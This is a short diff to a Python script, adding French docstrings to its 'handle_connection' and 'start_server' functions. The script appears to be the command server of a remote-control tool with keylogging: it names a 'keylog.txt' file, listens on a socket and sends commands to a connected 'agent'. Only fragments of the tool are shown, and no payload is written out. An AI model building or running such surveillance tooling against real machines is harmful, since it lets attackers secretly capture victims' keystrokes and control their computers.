@@ -6,6 +6,9 @@ port_number = 1234
 keylog_file = "keylog.txt"
 
 def handle_connection(connection, address):
+    """
+    Gère une connexion client-serveur en permettant d'envoyer des commandes au client et de traiter les réponses reçues.
+    """
     print(f"Connexion établie avec {address}")
 
     help_text = """
@@ -73,6 +76,9 @@ def handle_connection(connection, address):
     connection.close()
 
 def start_server():
+    """
+    Fonction pour établir une connexion avec l'agent.
+    """
     ss = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     ss.bind((ip_address, port_number))
     ss.listen(5)
